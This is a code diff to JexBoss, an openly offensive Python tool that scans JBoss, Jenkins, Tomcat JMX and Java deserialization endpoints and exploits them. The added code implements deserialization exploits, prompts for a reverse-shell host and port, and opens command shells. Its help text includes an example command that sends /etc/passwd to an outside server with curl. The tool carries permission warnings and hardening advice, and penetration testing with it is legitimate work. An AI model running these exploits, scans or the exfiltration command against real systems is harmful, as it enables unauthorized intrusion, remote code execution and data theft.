@@ -38,7 +38,7 @@ FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
 logging.basicConfig(filename='jexboss_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)
 
 __author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
-__version = "1.1.3"
+__version__ = "1.2.0"
 
 RED = '\x1b[91m'
 RED1 = '\033[31m'
@@ -168,7 +168,7 @@ def configure_http_pool():
 
     if gl_args.proxy:
         # when using proxy, protocol should be informed
-        if 'http' not in gl_args.host or 'http' not in gl_args.proxy:
+        if (gl_args.host is not None and 'http' not in gl_args.host) or 'http' not in gl_args.proxy:
             print_and_flush(RED + " * When using proxy, you must specify the http or https protocol"
                                   " (eg. http://%s).\n\n" %(gl_args.host if 'http' not in gl_args.host else gl_args.proxy) +ENDC)
             logging.critical('Protocol not specified')
@@ -222,7 +222,7 @@ def check_vul(url):
     """
     url_check = parse_url(url)
     if '443' in str(url_check.port) and url_check.scheme != 'https':
-        url = "https://"+str(url_check.host)+":"+str(url_check.port)
+        url = "https://"+str(url_check.host)+":"+str(url_check.port)+str(url_check.path)
 
     print_and_flush(GREEN + "\n ** Checking Host: %s **\n" % url)
     logging.info("Checking Host: %s" % url)
@@ -232,19 +232,202 @@ def check_vul(url):
                "User-Agent": get_random_user_agent()}
 
     paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
-             "web-console": "/web-console/ServerInfo.jsp",
+             "web-console": "/web-console/Invoker",
              "JMXInvokerServlet": "/invoker/JMXInvokerServlet",
-             "admin-console": "/admin-console/"}
+             "admin-console": "/admin-console/",
+             "Application Deserialization": "",
+             "Servlet Deserialization" : "",
+             "Jenkins": "",
+             "JMX Tomcat" : ""}
+
     fatal_error = False
-    for i in paths.keys():
+
+    for vector in paths:
+        r = None
         if gl_interrupted: break
         try:
-            r = gl_http_pool.request('HEAD', url + str(paths[i]), redirect=False, headers=headers)
-            print_and_flush(GREEN + " * Checking %s: \t" % i + ENDC, same_line=True)
-            paths[i] = r.status
 
+            # check jmx tomcat only if specifically chosen
+            if (gl_args.jmxtomcat and vector != 'JMX Tomcat') or\
+                    (not gl_args.jmxtomcat and vector == 'JMX Tomcat'): continue
+
+            if gl_args.app_unserialize and vector != 'Application Deserialization': continue
+
+            if gl_args.servlet_unserialize and vector != 'Servlet Deserialization': continue
+
+            if gl_args.jboss and vector not in ('jmx-console', 'web-console', 'JMXInvokerServlet', 'admin-console'): continue
+
+            if gl_args.jenkins and vector != 'Jenkins': continue
+
+            if gl_args.force:
+                paths[vector] = 200
+                continue
+
+            print_and_flush(GREEN + " [*] Checking %s: %s" % (vector, " " * (27 - len(vector))) + ENDC, same_line=True)
+
+            # check jenkins
+            if vector == 'Jenkins':
+
+                cli_port = None
+                # check version and search for CLI-Port
+                r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
+                all_headers = r.getheaders()
+
+                # versions > 658 are not vulnerable
+                if 'X-Jenkins' in all_headers:
+                    version = int(all_headers['X-Jenkins'].split('.')[1].split('.')[0])
+                    if version >= 638:
+                        paths[vector] = 505
+                        continue
+
+                for h in all_headers:
+                    if 'CLI-Port' in h:
+                        cli_port = int(all_headers[h])
+                        break
+
+                if cli_port is not None:
+                    paths[vector] = 200
+                else:
+                    paths[vector] = 505
+
+            # chek vul for Java Unserializable in Application Parameters
+            elif vector == 'Application Deserialization':
+
+                r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
+                if r.status in (301, 302, 303, 307, 308):
+                    cookie = r.getheader('set-cookie')
+                    if cookie is not None: headers['Cookie'] = cookie
+                    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
+                # link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
+                obj = _exploits.get_serialized_obj_from_param(str(r.data), gl_args.post_parameter)
+
+                # if no obj serialized, check if there's a html refresh redirect and follow it
+                if obj is None:
+                    # check if theres a redirect link
+                    link = _exploits.get_html_redirect_link(str(r.data))
+
+                    # If it is a redirect link. Follow it
+                    if link is not None:
+                        r = gl_http_pool.request('GET', url + "/" + link, redirect=True, headers=headers)
+                        #link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
+                        obj = _exploits.get_serialized_obj_from_param(str(r.data), gl_args.post_parameter)
+
+                # if obj does yet None
+                if obj is None:
+                    # search for other params that can be exploited
+                    list_params = _exploits.get_list_params_with_serialized_objs(str(r.data))
+                    if len(list_params) > 0:
+                        paths[vector] = 110
+                        print_and_flush(RED + "  [ CHECK OTHER PARAMETERS ]" + ENDC)
+                        print_and_flush(RED + "\n * The \"%s\" parameter does not appear to be vulnerable.\n" %gl_args.post_parameter +
+                                                "   But there are other parameters that it seems to be xD!\n" +ENDC+GREEN+
+                                          BOLD+ "\n   Try these other parameters: \n" +ENDC)
+                        for p in list_params:
+                            print_and_flush(GREEN +  "      -H %s" %p+ ENDC)
+                        print ("")
+                elif obj is not None and obj == 'stateless':
+                    paths[vector] = 100
+                elif obj is not None:
+                    paths[vector] = 200
+
+            # chek vul for Java Unserializable in viewState
+            elif vector == 'Servlet Deserialization':
+
+                r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
+                if r.status in (301, 302, 303, 307, 308):
+                    cookie = r.getheader('set-cookie')
+                    headers['Cookie'] = cookie
+                    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
+
+                if 'x-java-serialized-object' in r.getheader('Content-Type'):
+                    paths[vector] = 200
+                else:
+                    paths[vector] = 505
+
+            elif vector == 'JMX Tomcat':
+
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(7)
+                host_rmi = url.split(':')[0]
+                port_rmi = int(url.split(':')[1])
+                s.connect((host_rmi, port_rmi))
+                s.send(b"JRMI\x00\x02K")
+                msg = s.recv(1024)
+                octets = str(msg[3:]).split(".")
+                if len(octets) != 4:
+                    paths[vector] = 505
+                else:
+                    paths[vector] = 200
+
+            # check jboss vectors
+            elif vector == "JMXInvokerServlet":
+                # user privided web-console path and checking JMXInvoker...
+                if "/web-console/Invoker" in url:
+                    paths[vector] = 505
+                # if the user not provided the path, append the "/invoker/JMXInvokerServlet"
+                else:
+
+                    if not url.endswith(str(paths[vector])) and not url.endswith(str(paths[vector])+"/"):
+                        url_to_check = url + str(paths[vector])
+                    else:
+                        url_to_check = url
+
+                    r = gl_http_pool.request('HEAD', url_to_check , redirect=False, headers=headers)
+                    # if head method is not allowed/supported, try GET
+                    if r.status in (405, 406):
+                        r = gl_http_pool.request('GET', url_to_check , redirect=False, headers=headers)
+
+                    # if web-console/Invoker or invoker/JMXInvokerServlet
+                    if 'x-java-serialized-object' in r.getheader('Content-Type'):
+                        paths[vector] = 200
+                    else:
+                        paths[vector] = 505
+
+            elif vector == "web-console":
+                # user privided JMXInvoker path and checking web-console...
+                if "/invoker/JMXInvokerServlet" in url:
+                    paths[vector] = 505
+                # if the user not provided the path, append the "/web-console/..."
+                else:
+
+                    if not url.endswith(str(paths[vector])) and not url.endswith(str(paths[vector]) + "/"):
+                        url_to_check = url + str(paths[vector])
+                    else:
+                        url_to_check = url
+
+                    r = gl_http_pool.request('HEAD', url_to_check, redirect=False, headers=headers)
+                    # if head method is not allowed/supported, try GET
+                    if r.status in (405, 406):
+                        r = gl_http_pool.request('GET', url_to_check, redirect=False, headers=headers)
+
+                    # if web-console/Invoker or invoker/JMXInvokerServlet
+                    if 'x-java-serialized-object' in r.getheader('Content-Type'):
+                        paths[vector] = 200
+                    else:
+                        paths[vector] = 505
+
+            # other jboss vector
+            else:
+                r = gl_http_pool.request('HEAD', url + str(paths[vector]), redirect=False, headers=headers)
+                # if head method is not allowed/supported, try GET
+                if r.status in (405, 406):
+                    r = gl_http_pool.request('GET', url + str(paths[vector]), redirect=False, headers=headers)
+                # check if the server respond with 200/500 for all requests
+                if r.status in (200, 500):
+                    r = gl_http_pool.request('GET', url + str(paths[vector])+ '/github.com/joaomatosf/jexboss', redirect=False,headers=headers)
+
+                    if r.status == 200:
+                        r.status = 505
+                    else:
+                        r.status = 200
+
+                paths[vector] = r.status
+
+            # ----------------
+            # Analysis of the results
+            # ----------------
             # check if the proxy do not support running in the same port of the target
-            if r.status == 400 and gl_args.proxy:
+            if r is not None and r.status == 400 and gl_args.proxy:
                 if parse_url(gl_args.proxy).port == url_check.port:
                     print_and_flush(RED + "[ ERROR ]\n * An error occurred because the proxy server is running on the "
                                        "same port as the server port (port %s).\n"
@@ -254,31 +437,40 @@ def check_vul(url):
                     break
 
             # check if it's false positive
-            if len(r.getheaders()) == 0:
+            if r is not None and len(r.getheaders()) == 0:
                 print_and_flush(RED + "[ ERROR ]\n * The server %s is not an HTTP server.\n" % url + ENDC)
                 logging.error("The server %s is not an HTTP server." % url)
-                paths = {"jmx-console": 505,
-                         "web-console": 505,
-                         "JMXInvokerServlet": 505,
-                         "admin-console": 505}
+                for key in paths: paths[key] = 505
                 break
 
-            if paths[i] in (301, 302, 303, 307, 308):
+            if paths[vector] in (301, 302, 303, 307, 308):
                 url_redirect = r.get_redirect_location()
-                print_and_flush(GREEN + "[ REDIRECT ]\n * The server sent a redirect to: %s\n" % url_redirect)
-            elif paths[i] == 200 or paths[i] == 500:
-                if i == "admin-console":
-                    print_and_flush(RED + "[ EXPOSED ]" + ENDC)
+                print_and_flush(GREEN + "  [ REDIRECT ]\n * The server sent a redirect to: %s\n" % url_redirect)
+            elif paths[vector] == 200 or paths[vector] == 500:
+                if vector == "admin-console":
+                    print_and_flush(RED + "  [ EXPOSED ]" + ENDC)
                     logging.info("Server %s: EXPOSED" %url)
+                elif vector == "Jenkins":
+                    print_and_flush(RED + "  [ POSSIBLE VULNERABLE ]" + ENDC)
+                    logging.info("Server %s: RUNNING JENKINS" %url)
+                elif vector == "JMX Tomcat":
+                    print_and_flush(RED + "  [ MAYBE VULNERABLE ]" + ENDC)
+                    logging.info("Server %s: RUNNING JENKINS" %url)
                 else:
-                    print_and_flush(RED + "[ VULNERABLE ]" + ENDC)
+                    print_and_flush(RED + "  [ VULNERABLE ]" + ENDC)
                     logging.info("Server %s: VULNERABLE" % url)
+            elif paths[vector] == 100:
+                paths[vector] = 200
+                print_and_flush(RED + "  [ INCONCLUSIVE - NEED TO CHECK ]" + ENDC)
+                logging.info("Server %s: INCONCLUSIVE - NEED TO CHECK" % url)
+            elif paths[vector] == 110:
+                logging.info("Server %s: CHECK OTHERS PARAMETERS" % url)
             else:
-                print_and_flush(GREEN + "[ OK ]")
+                print_and_flush(GREEN + "  [ OK ]")
         except:
             print_and_flush(RED + "\n * An error occurred while connecting to the host %s\n" % url + ENDC)
             logging.info("An error occurred while connecting to the host %s" % url, exc_info=traceback)
-            paths[i] = 505
+            paths[vector] = 505
 
     if fatal_error:
         exit(1)
@@ -297,38 +489,165 @@ def auto_exploit(url, exploit_type):
     exploitJMXInvokerFileRepository: tested and working in JBoss 4 and 5
     exploitAdminConsole: tested and working in JBoss 5 and 6 (with default password)
     """
-    print_and_flush(GREEN + "\n * Sending exploit code to %s. Please wait...\n" % url)
+    if exploit_type in ("Application Deserialization", "Servlet Deserialization"):
+        print_and_flush(GREEN + "\n * Preparing to send exploit to %s. Please wait...\n" % url)
+    else:
+        print_and_flush(GREEN + "\n * Sending exploit code to %s. Please wait...\n" % url)
+
     result = 505
     if exploit_type == "jmx-console":
+
         result = _exploits.exploit_jmx_console_file_repository(url)
         if result != 200 and result != 500:
             result = _exploits.exploit_jmx_console_main_deploy(url)
+
     elif exploit_type == "web-console":
+
+        # if the user not provided the path
+        if url.endswith("/web-console/Invoker") or url.endswith("/web-console/Invoker/"):
+            url = url.replace("/web-console/Invoker", "")
+
         result = _exploits.exploit_web_console_invoker(url)
+        if result == 404:
+            host, port = get_host_port_reverse_params()
+            if host == port == gl_args.cmd == None: return False
+            result = _exploits.exploit_servlet_deserialization(url + "/web-console/Invoker", host=host, port=port,
+                                                               cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget)
     elif exploit_type == "JMXInvokerServlet":
+
+        # if the user not provided the path
+        if url.endswith("/invoker/JMXInvokerServlet") or url.endswith("/invoker/JMXInvokerServlet/"):
+            url = url.replace("/invoker/JMXInvokerServlet", "")
+
         result = _exploits.exploit_jmx_invoker_file_repository(url, 0)
         if result != 200 and result != 500:
             result = _exploits.exploit_jmx_invoker_file_repository(url, 1)
+        if result == 404:
+            host, port = get_host_port_reverse_params()
+            if host == port == gl_args.cmd == None: return False
+            result = _exploits.exploit_servlet_deserialization(url + "/invoker/JMXInvokerServlet", host=host, port=port,
+                                                               cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget)
+
     elif exploit_type == "admin-console":
+
         result = _exploits.exploit_admin_console(url, gl_args.jboss_login)
 
-    if result == 200 or result == 500:
+    elif exploit_type == "Jenkins":
+
+        host, port = get_host_port_reverse_params()
+        if host == port == gl_args.cmd == None: return False
+        result = _exploits.exploit_jenkins(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
+                                                   gadget=gl_args.gadget, show_payload=gl_args.show_payload)
+    elif exploit_type == "JMX Tomcat":
+
+        host, port = get_host_port_reverse_params()
+        if host == port == gl_args.cmd == None: return False
+        result = _exploits.exploit_jrmi(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows)
+
+    elif exploit_type == "Application Deserialization":
+
+        host, port = get_host_port_reverse_params()
+
+        if host == port == gl_args.cmd == gl_args.load_gadget == None: return False
+
+        result = _exploits.exploit_application_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
+                                                               param=gl_args.post_parameter, force=gl_args.force,
+                                                               gadget_type=gl_args.gadget, show_payload=gl_args.show_payload,
+                                                               gadget_file=gl_args.load_gadget)
+
+    elif exploit_type == "Servlet Deserialization":
+
+        host, port = get_host_port_reverse_params()
+
+        if host == port == gl_args.cmd == gl_args.load_gadget == None: return False
+
+        result = _exploits.exploit_servlet_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
+                                                               gadget=gl_args.gadget, gadget_file=gl_args.load_gadget)
+
+    # if it seems to be exploited (201 is for jboss exploited with gadget)
+    if result == 200 or result == 500 or result == 201:
+
+        # if not auto_exploit, ask type enter to continue...
         if not gl_args.auto_exploit:
-            print_and_flush(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
-            shell_http(url, exploit_type)
+
+            if exploit_type in ("Application Deserialization", "Jenkins", "JMX Tomcat", "Servlet Deserialization") or result == 201:
+                print_and_flush(BLUE + " * The exploit code was successfully sent. Check if you received the reverse shell\n"
+                                       "   connection on your server or if your command was executed. \n"+ ENDC+
+                                       "   Type [ENTER] to continue...\n")
+                # wait while enter is typed
+                input().lower() if version_info[0] >= 3 else raw_input().lower()
+                return True
+            else:
+                print_and_flush(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
+                shell_http(url, exploit_type)
+
+        # if auto exploit mode, print message and continue...
         else:
-            print_and_flush(GREEN + " * Successfully deployed code via vector %s\n *** Run JexBoss in Standalone mode "
+            print_and_flush(GREEN + " * Successfully deployed/sended code via vector %s\n *** Run JexBoss in Standalone mode "
                                     "to open command shell. ***" %(exploit_type) + ENDC)
             return True
+
+    # if not exploited, print error messagem and ask for type enter
     else:
-        print_and_flush(RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n" +
-                              "   Waiting for 7 seconds...\n " + ENDC)
-        logging.error("Could not exploit the server %s automatically. HTTP Code: %s" %(url, result))
-        if gl_args.mode == 'standalone':
-            sleep(7)
-            return False
+        if exploit_type == 'admin-console':
+            print_and_flush(GREEN + "\n * You can still try to exploit deserialization vulnerabilitie in ViewState!\n" +
+                     "   Try this: python jexboss.py -u %s/admin-console/login.seam --app-unserialize\n" %url +
+                     "   Type [ENTER] to continue...\n" + ENDC)
+
         else:
-            return False
+            print_and_flush(RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n" +
+                                "   Type [ENTER] to continue...\n" + ENDC)
+        logging.error("Could not exploit the server %s automatically. HTTP Code: %s" %(url, result))
+        # wait while enter is typed
+        input().lower() if version_info[0] >= 3 else raw_input().lower()
+        return False
+
+
+def ask_for_reverse_host_and_port():
+    print_and_flush(GREEN + " * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.\n"
+                            "   OBS: You can also use the --cmd \"command\" to send specific commands to run on the server."+NORMAL)
+
+    # If not *nix (that is, if somethine like git bash on Rwindow$)
+    if not sys.stdout.isatty():
+        print_and_flush("   IP Address (RHOST): ", same_line=True)
+        host = input().lower() if version_info[0] >= 3 else raw_input().lower()
+        print_and_flush("   Port (RPORT): ", same_line=True)
+        port = input().lower() if version_info[0] >= 3 else raw_input().lower()
+    else:
+        host = input("   IP Address (RHOST): ").lower() if version_info[0] >= 3 else raw_input("   IP Address (RHOST): ").lower()
+        port = input("   Port (RPORT): ").lower() if version_info[0] >= 3 else raw_input("   Port (RPORT): ").lower()
+
+    print ("")
+    return str(host), str(port)
+
+
+def get_host_port_reverse_params():
+    # if reverse host were provided in the args, take it
+    if gl_args.reverse_host:
+
+        if gl_args.windows:
+            jexboss.print_and_flush(RED + "\n * WINDOWS Systems still do not support reverse shell.\n"
+                                          "   Use option --cmd instead of --reverse-shell...\n" + ENDC +
+                                    "   Type [ENTER] to continue...\n")
+            # wait while enter is typed
+            input().lower() if version_info[0] >= 3 else raw_input().lower()
+            return None, None
+
+        tokens = gl_args.reverse_host.split(":")
+        if len(tokens) != 2:
+            host, port = ask_for_reverse_host_and_port()
+        else:
+            host = tokens[0]
+            port = tokens[1]
+    # if neither cmd nor reverse nor load_gadget was provided, ask host and port
+    elif gl_args.cmd is None and gl_args.load_gadget is None:
+        host, port = ask_for_reverse_host_and_port()
+    else:
+        # if cmd or gadget file ware privided
+        host, port = None, None
+
+    return host, port
+
 
 # FIX: capture the readtimeout   File "jexboss.py", line 333, in shell_http
 def shell_http(url, shell_type):
@@ -432,25 +751,46 @@ def banner():
     """
     clear()
     print_and_flush(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
+                 " |  * And others Java Deserialization Vulnerabilities * | \n"
                  " |                                                      |\n"
                  " | @author:  João Filho Matos Figueiredo                |\n"
                  " | @contact: joaomatosf@gmail.com                       |\n"
                  " |                                                      |\n"
                  " | @update: https://github.com/joaomatosf/jexboss       |\n"
                  " #______________________________________________________#\n")
-    print_and_flush(RED1 + " @version: %s\n"%__version )
-
+    print_and_flush(RED1 + " @version: %s" % __version__)
     print_and_flush (ENDC)
 
 
 def help_usage():
-    usage = (BOLD + BLUE + "\n Examples:" + ENDC +
-    BLUE + "\n For simple usage, you must provide the host name or IP address you want to test:" +
-    GREEN + "\n  $ python jexboss.py -host https://site.com.br" +
-    BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, list of ports and filename for store results:" +
-    GREEN + "\n  $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log" +
-    BLUE + "\n\n For file scan mode, you must provide the filename with host list to be scanned (one host per line)and filename for store results:" +
-    GREEN + "\n  $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log" + ENDC)
+    usage = (BOLD + BLUE + " Examples: [for more options, type python jexboss.py -h]\n" + ENDC +
+    BLUE + "\n For simple usage, you must provide the host name or IP address you\n"
+           " want to test [-host or -u]:\n" +
+    GREEN + "\n  $ python jexboss.py -u https://site.com.br" +
+
+     BLUE + "\n\n For Java Deserialization Vulnerabilities in HTTP POST parameters. \n"
+            " This will ask for an IP address and port to try to get a reverse shell:\n" +
+     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize" +
+
+     BLUE + "\n\n For Java Deserialization Vulnerabilities in a custom HTTP parameter and \n"
+            " to send a custom command to be executed on the exploited server:\n" +
+     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize\n"
+             "    -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server'" +
+
+     BLUE + "\n\n For Java Deserialization Vulnerabilities in a Servlet (like Invoker):\n"+
+     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize\n" +
+
+     BLUE + "\n\n For Jenkins CLI Deserialization Vulnerabilitie:\n"+
+     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/jenkins --jenkins"+
+
+     BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, "
+   "\n list of ports and filename for store results:\n" +
+    GREEN + "\n  $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 \n"
+            "    -results report_auto_scan.log" +
+
+    BLUE + "\n\n For file scan mode, you must provide the filename with host list "
+           "\n to be scanned (one host per line) and filename for store results:\n" +
+    GREEN + "\n  $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log\n" + ENDC)
     return usage
 
 
@@ -499,16 +839,24 @@ def main():
     if gl_args.mode == 'standalone':
         url = gl_args.host
         scan_results = check_vul(url)
-        # performs exploitation
-        for i in ["jmx-console", "web-console", "JMXInvokerServlet", "admin-console"]:
-            if scan_results[i] == 200 or scan_results[i] == 500:
+        # performs exploitation for jboss vulnerabilities
+        for vector in scan_results:
+            if scan_results[vector] == 200 or scan_results[vector] == 500:
                 vulnerables = True
                 if gl_args.auto_exploit:
-                    auto_exploit(url, i)
+                    auto_exploit(url, vector)
                 else:
+
+                    if vector == "Application Deserialization":
+                        msg_confirm = "   If successful, this operation will provide a reverse shell. You must enter the\n" \
+                                      "   IP address and Port of your listening server.\n"
+                    else:
+                        msg_confirm = "   If successful, this operation will provide a simple command shell to execute \n" \
+                                      "   commands on the server..\n"
+
                     print_and_flush(BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
-                          BOLD + i + NORMAL + "\" ?\n" +
-                          "   This operation will provide a simple command shell to execute commands on the server..\n" +
+                          BOLD + vector + NORMAL + "\" ?\n" +
+                          msg_confirm +
                           RED + "   Continue only if you have permission!" + ENDC)
                     if not sys.stdout.isatty():
                         print_and_flush("   yes/NO? ", same_line=True)
@@ -517,7 +865,8 @@ def main():
                         pick = input("   yes/NO? ").lower() if version_info[0] >= 3 else raw_input("   yes/NO? ").lower()
 
                     if pick == "yes":
-                        auto_exploit(url, i)
+                        auto_exploit(url, vector)
+
     # check vulnerabilities for auto scan mode
     elif gl_args.mode == 'auto-scan':
         file_results = open(gl_args.results, 'w')
@@ -544,7 +893,7 @@ def main():
                 else:
                     print_and_flush (RED+"\n * Host %s:%s does not respond."% (ip,port)+ENDC)
         file_results.close()
-
+    # check vulnerabilities for file scan mode
     elif gl_args.mode == 'file-scan':
         file_results = open(gl_args.out, 'w')
         file_results.write("JexBoss Scan Mode Report\n\n")
@@ -581,34 +930,38 @@ def main():
             print_and_flush(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.out) + ENDC)
         elif gl_args.mode == 'auto-scan':
             print_and_flush(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.results) + ENDC)
-        print_and_flush(GREEN + " * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n"
+
+        print_and_flush(GREEN + " ---------------------------------------------------------------------------------\n"
              +BOLD+   " Recommendations: \n" +ENDC+
               GREEN+  " - Remove web consoles and services that are not used, eg:\n"
-                      "    $ rm web-console.war\n"
-                      "    $ rm http-invoker.sar\n"
-                      "    $ rm jmx-console.war\n"
-                      "    $ rm jmx-invoker-adaptor-server.sar\n"
-                      "    $ rm admin-console.war\n"
+                      "    $ rm web-console.war http-invoker.sar jmx-console.war jmx-invoker-adaptor-server.sar admin-console.war\n"
                       " - Use a reverse proxy (eg. nginx, apache, F5)\n"
                       " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
-                      " - Search vestiges of exploitation within the directories \"deploy\" and \"management\".\n\n"
-                      " References:\n"
+                      " - Search vestiges of exploitation within the directories \"deploy\" and \"management\".\n"
+                      " - Do NOT TRUST serialized objects received from the user\n"
+                      " - If possible, stop using serialized objects as input!\n"
+                      " - If you need to work with serialization, consider migrating to the Gson lib.\n"
+                      " - Use a strict whitelist with Look-ahead[3] before deserialization\n"
+                      " - For a quick (but not definitive) remediation for the viewState input, store the state \n"
+                      "   of the view components on the server (this will increase the heap memory consumption): \n"
+                      "      In web.xml, change the \"client\" parameter to \"server\" on STATE_SAVING_METHOD.\n"
+                      "\n References:\n"
                       "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
                       "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
+                      "   [3] - https://www.ibm.com/developerworks/library/se-lookahead/\n"
+                      "   [4] - https://www.owasp.org/index.php/Deserialization_of_untrusted_data\n"
                       "\n"
                       " - If possible, discard this server!\n"
-                      " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n")
+                      " ---------------------------------------------------------------------------------")
     else:
         print_and_flush(GREEN + "\n\n * Results: \n" +
-              "   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
+              "   The server is not vulnerable to bugs tested ... :D\n" + ENDC)
     # infos
     print_and_flush(ENDC + " * Info: review, suggestions, updates, etc: \n" +
           "   https://github.com/joaomatosf/jexboss\n")
 
-    print_and_flush(GREEN + BOLD + " * DONATE: " + ENDC + "Please consider making a donation to help improve this tool,\n"
-                                                "           including research to new versions of JBoss and zero days. \n\n" +
-          GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" +
-          GREEN + BOLD + " * URI: " + ENDC + " bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss\n")
+    print_and_flush(GREEN + BOLD + " * DONATE: " + ENDC + "Please consider making a donation to help improve this tool,\n" +
+          GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" )
 
 
 print_and_flush(ENDC)
@@ -618,34 +971,49 @@ print_and_flush(ENDC)
 
 if __name__ == "__main__":
 
+
     parser = argparse.ArgumentParser(
         formatter_class=argparse.RawDescriptionHelpFormatter,
         #description="JexBoss v%s: JBoss verify and EXploitation Tool" %__version,
-        description=textwrap.dedent(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
+        description=textwrap.dedent(RED1 +
+               "\n # --- JexBoss: Jboss verify and EXploitation Tool  --- #\n"
+                 " |    And others Java Deserialization Vulnerabilities   | \n"
                  " |                                                      |\n"
                  " | @author:  João Filho Matos Figueiredo                |\n"
                  " | @contact: joaomatosf@gmail.com                       |\n"
                  " |                                                      |\n"
-                 " | @update: https://github.com/joaomatosf/jexboss       |\n"
+                 " | @updates: https://github.com/joaomatosf/jexboss      |\n"
                  " #______________________________________________________#\n"
-                 " @version: "+__version+"\n"+ help_usage()),
+                 " @version: " + __version__ + "\n" + help_usage()),
         epilog="",
         prog="JexBoss"
     )
 
     group_standalone = parser.add_argument_group('Standalone mode')
+    group_advanced = parser.add_argument_group('Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER)')
     group_auto_scan = parser.add_argument_group('Auto scan mode')
     group_file_scan = parser.add_argument_group('File scan mode')
 
-    parser.add_argument('--version', action='version', version='%(prog)s ' + __version)
-    parser.add_argument("--auto-exploit", "-A",
-                        help="Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!)",
+    # optional parameters ---------------------------------------------------------------------------------------
+    parser.add_argument('--version', action='version', version='%(prog)s ' + __version__)
+    parser.add_argument("--auto-exploit", "-A", help="Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!)",
                         action='store_true')
     parser.add_argument("--disable-check-updates", "-D", help="Disable two updates checks: 1) Check for updates "
                         "performed by the webshell in exploited server at http://webshell.jexboss.net/jsp_version.txt and 2) check for updates "
                         "performed by the jexboss client at http://joaomatosf.com/rnp/releases.txt",
                         action='store_true')
-    parser.add_argument('-mode', help="Operation mode", choices=['standalone', 'auto-scan', 'file-scan'], default='standalone')
+    parser.add_argument('-mode', help="Operation mode (DEFAULT: standalone)", choices=['standalone', 'auto-scan', 'file-scan'], default='standalone')
+    parser.add_argument("--app-unserialize", "-j",
+                        help="Check for java unserialization vulnerabilities in HTTP parameters (eg. javax.faces.ViewState, "
+                             "oldFormData, etc)", action='store_true')
+    parser.add_argument("--servlet-unserialize", "-l",
+                        help="Check for java unserialization vulnerabilities in Servlets (like Invoker interfaces)",
+                        action='store_true')
+    parser.add_argument("--jboss", help="Check only for JBOSS vectors.", action='store_true')
+    parser.add_argument("--jenkins",  help="Check only for Jenkins CLI vector (CVE-2015-5317).", action='store_true')
+    parser.add_argument("--jmxtomcat", help="Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and "
+                                            "CVE-2016-3427). OBS: Will not be checked by default.", action='store_true')
+
     parser.add_argument('--proxy', "-P", help="Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128)", )
     parser.add_argument('--proxy-cred', "-L", help="Proxy authentication credentials (eg -L name:password)", metavar='LOGIN:PASS')
     parser.add_argument('--jboss-login', "-J", help="JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 "
@@ -653,8 +1021,38 @@ if __name__ == "__main__":
     parser.add_argument('--timeout', help="Seconds to wait before timeout connection (default 3)", default=3, type=int)
     #parser.add_argument('--retries', help="Retries when the connection timeouts (default 3)", default=3, type=int)
 
+    # advanced parameters ---------------------------------------------------------------------------------------
+    group_advanced.add_argument("--reverse-host", "-r", help="Remote host address and port for reverse shell when exploiting "
+                                                             "Java Deserialization Vulnerabilities in application layer "
+                                                             "(for now, working only against *nix systems)"
